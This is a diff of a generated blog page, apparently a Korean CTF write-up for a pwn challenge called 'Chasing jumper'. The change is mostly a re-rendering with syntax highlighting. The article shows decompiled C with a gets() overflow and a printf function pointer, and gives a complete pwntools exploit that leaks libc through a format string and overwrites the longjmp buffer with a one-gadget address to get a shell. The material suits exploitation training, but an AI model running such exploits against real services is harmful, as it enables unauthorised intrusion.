@@ -87,7 +87,7 @@
     
     
     
-    <link rel="stylesheet" href="/css/academic.9d6ce9c04eee97bcc8f93581ce7495e2.css">
+    <link rel="stylesheet" href="/css/academic.e78f017ea792fc76a38fabdaae146b55.css">
   
 
   
@@ -426,8 +426,8 @@
 
 
 
-<meta content="2019-11-02 18:32:15 &#43;0900 KST" itemprop="datePublished">
-<meta content="2019-11-02 18:32:15 &#43;0900 KST" itemprop="dateModified">
+<meta content="2019-11-02 18:32:15 &#43;0900 &#43;0900" itemprop="datePublished">
+<meta content="2019-11-02 18:32:15 &#43;0900 &#43;0900" itemprop="dateModified">
 
 <div class="article-metadata">
 
@@ -531,100 +531,90 @@
   <div class="article-container">
 
     <div class="article-style" itemprop="articleBody">
-      <pre><code class="language-c">void main(__int64 argc, char **argv, char **env)
-{
-  char **_argv; // [sp+0h] [bp-20h]@1
-  int _menu; // [sp+14h] [bp-Ch]@2
-
-  _argv = argv;
-  qword_202060[29] = (void (__fastcall *)(_QWORD, _QWORD))off_202010;
-  setvbuf(stdout, 0, 2, 0);
-  puts(&quot;let's Chasing jumper. Paladin!&quot;);
-  while ( 1 )
-  {
-    while ( 1 )
-    {
-      menu();
-      _menu = getchar();
-      getchar();
-      fflush(stdin);
-      if ( _menu != '1' )
-        break;
-      printf(&quot;Damn! we lost jumper trace.. you should find it yourself.&quot;);
-    }
-    if ( _menu == '2' )
-      break;
-    puts(&quot;wrong input!&quot;);
-  }
-  printf(&quot;open the portal. FIRST TRY : &quot;);
-  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&amp;qword_202060[4]) )
-    sub_95A((__int64)qword_202060);
-  puts(&quot;\nYou Failed! I'll give you one more chance! &quot;);
-  printf(&quot;SECOND TRY : &quot;);
-  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&amp;qword_202060[4]) )
-    sub_95A((__int64)qword_202060);
-  puts(&quot;You Failed Again! we lost signal..&quot;);
-  exit(0);
-}
-</code></pre>
-
-<p>메뉴는 다음과 같습니다.</p>
-
-<pre><code class="language-c">int menu()
-{
-  puts(&quot;what do you want? &quot;);
-  puts(&quot;1 : find jumper's traces.&quot;);
-  puts(&quot;2 : open the portal &quot;);
-  return printf(&quot;&gt; &quot;);
-}
-</code></pre>
-
-<pre><code class="language-c">void __fastcall __noreturn sub_95A(__int64 s)
-{
-  fflush(stdin);
-  gets(s);
-  if ( strchr((const char *)s, 'n') )
-  {
-    puts(&quot;wait, what are you doing?&quot;);
-    exit(0);
-  }
-  qword_202060[29](s, 'n');
-  longjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )(s + 32), 1);
-}
-</code></pre>
-
-<pre><code class="language-c">.data:0000000000202010 off_202010      dq offset printf        ; DATA XREF: main+1Ao
-</code></pre>
-
-<pre><code class="language-py">from pwn import *
-
-def main():
-    r = remote('172.17.0.2', 1300)
-    #r = remote('1.224.175.17', 9982)
-    libc = ELF('./libc.so.6')
-    one_shot = 0x10a38c
-
-    r.recvuntil('&gt; ')
-    r.sendline(str(2))
-
-    raw_input()
-    r.recvuntil(': ')
-    r.sendline('%2$p')
-    a0 = r.recvline()
-    libc.address = int(a0, 16) - 413312
-    log.info(hex(libc.address))
-    # %2$p = libc + 413312
-
-    r.recvuntil(': ')
-    r.sendline('A' * 0xe8 + p64(libc.address + one_shot))
-    #r.sendline('a' * (8 * 29) + 'b')
-
-    r.interactive()
-
-if __name__ == '__main__':
-    main()
-</code></pre>
-
+      <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>env)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>_argv; <span style="color:#75715e">// [sp+0h] [bp-20h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> _menu; <span style="color:#75715e">// [sp+14h] [bp-Ch]@2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  _argv <span style="color:#f92672">=</span> argv;
+</span></span><span style="display:flex;"><span>  qword_202060[<span style="color:#ae81ff">29</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(_QWORD, _QWORD))off_202010;
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;let&#39;s Chasing jumper. Paladin!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      menu();
+</span></span><span style="display:flex;"><span>      _menu <span style="color:#f92672">=</span> getchar();
+</span></span><span style="display:flex;"><span>      getchar();
+</span></span><span style="display:flex;"><span>      fflush(stdin);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( _menu <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;1&#39;</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Damn! we lost jumper trace.. you should find it yourself.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( _menu <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;wrong input!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;open the portal. FIRST TRY : &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>_setjmp((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>__attribute__((__org_arrdim(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>))) )<span style="color:#f92672">&amp;</span>qword_202060[<span style="color:#ae81ff">4</span>]) )
+</span></span><span style="display:flex;"><span>    sub_95A((<span style="color:#66d9ef">__int64</span>)qword_202060);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You Failed! I&#39;ll give you one more chance! &#34;</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;SECOND TRY : &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>_setjmp((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>__attribute__((__org_arrdim(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>))) )<span style="color:#f92672">&amp;</span>qword_202060[<span style="color:#ae81ff">4</span>]) )
+</span></span><span style="display:flex;"><span>    sub_95A((<span style="color:#66d9ef">__int64</span>)qword_202060);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You Failed Again! we lost signal..&#34;</span>);
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>메뉴는 다음과 같습니다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">menu</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;what do you want? &#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;1 : find jumper&#39;s traces.&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;2 : open the portal &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">sub_95A</span>(<span style="color:#66d9ef">__int64</span> s)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  fflush(stdin);
+</span></span><span style="display:flex;"><span>  gets(s);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( strchr((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)s, <span style="color:#e6db74">&#39;n&#39;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;wait, what are you doing?&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  qword_202060[<span style="color:#ae81ff">29</span>](s, <span style="color:#e6db74">&#39;n&#39;</span>);
+</span></span><span style="display:flex;"><span>  longjmp((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>__attribute__((__org_arrdim(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>))) )(s <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>), <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.data:<span style="color:#ae81ff">0000000000202010</span> off_202010      dq offset printf        ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>Ao
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;172.17.0.2&#39;</span>, <span style="color:#ae81ff">1300</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r = remote(&#39;1.224.175.17&#39;, 9982)</span>
+</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>    one_shot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10a38c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    raw_input()
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;%2$p&#39;</span>)
+</span></span><span style="display:flex;"><span>    a0 <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(a0, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">413312</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># %2$p = libc + 413312</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xe8</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> one_shot))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.sendline(&#39;a&#39; * (8 * 29) + &#39;b&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
     </div>
 
     
@@ -749,7 +739,7 @@ if __name__ == '__main__':
 <section id="comments">
   <div id="disqus_thread"></div>
 <script type="application/javascript">
-    var disqus_config = function () {
+    window.disqus_config = function () {
     
     
     
@@ -868,7 +858,7 @@ if __name__ == '__main__':
     
     
     
-    <script src="/js/academic.min.55cec13bc0aa6adeb045a602375e60b9.js"></script>
+    <script src="/js/academic.min.60fe6a17da6f5e53d33cccef2fb2e256.js"></script>
 
     
 
@@ -883,7 +873,7 @@ if __name__ == '__main__':
   
 
   <p class="powered-by">
-    &copy; 2021 j3rrry &middot; 
+    © 2022 j3rrry &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
